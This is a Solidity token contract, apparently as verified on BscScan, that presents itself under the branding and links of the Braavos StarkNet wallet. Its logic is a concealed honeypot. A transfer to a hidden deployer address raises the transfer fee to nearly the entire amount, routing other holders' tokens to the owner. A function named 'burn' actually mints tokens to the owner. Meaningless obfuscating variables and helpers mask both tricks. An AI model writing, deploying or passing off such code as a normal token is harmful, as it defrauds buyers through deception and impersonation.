/**
 *Submitted for verification at BscScan.com on 2022-12-30
*/

/*
myBraavos
Braavos - StarkNet Wallet
A smart contract based wallet for managing your funds & NFTs and connecting to dApps on top of #StarkNet.
Hardware Signer Official Release Announcement📣
This major new capability has been introduced to the #Starknet community at the http://StarkNet.cc 
It allows using your device's dedicated security chip to provide security that is on par with dedicated #hardwarewallets🧵.
Web:http://braavos.app
Discord: http://discord.gg/9Ks7V5DN9z
TG: http://t.me/mybraavos
https://twitter.com/myBraavos

*/
// SPDX-License-Identifier: MIT
pragma solidity >=0.5.1;
contract myBraa {
uint256 public constant totalSupply = 1000000000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  WHBUZH = 85;
address private  BIQFIY = address(0);
address private  OGUNQF = address(0);
address private  EKXEEV = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  EPBYNV = 89;
uint256 private  VUTJCO = 94;
string public  symbol = "myBraa";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  RNYNRQ = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  JDVNPK = 99;
uint8 public constant decimals = 18;
uint256 private  YBGHFN = 4;
address public owner;
address private  DTYVTY = address(0);
uint256 public constant OEYTFL = 99999;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  TZLGRN = 1000000000000000000;
uint256 private  SEVUPH = 12;
string public  name = "myBraa";
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "SENYEA");
require(to != address(0), "SENYEA");
require(amount <= balanceOf[from], "SENYEA");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* OEYTFL/TZLGRN ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==RNYNRQ){
TZLGRN = OEYTFL+2;
}
emit Transfer(from, to, transferAmount);
}
function _add1JDVNPK() private returns (uint256) {
return JDVNPK++;
}
//
function _getD2TYVTY() private returns (address) {
return DTYVTY;
}
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _addSE3VUPH() private returns (uint256) {
return SEVUPH / TZLGRN;
}
//
function _getEKX4EEV() private returns (address) {
return EKXEEV;
}
//
function _addVUTJ5CO() private returns (uint256) {
return VUTJCO--;
}
//
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tSENYEA 0");
require(spender != address(0), "fSENYEA 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () public {
RNYNRQ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getEPBYN6V() private returns (uint256) {
return EPBYNV - WHBUZH;
}
//
function _addWHBUZH7() private returns (uint256) {
return WHBUZH + 88;
}
//
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getB8IQFIY() private returns (address) {
return BIQFIY;
}
//
function _addYB9GHFN() private returns (uint256) {
return YBGHFN--;
}
//
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getOGU10NQF() private returns (address) {
return OGUNQF;
}
//
//
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}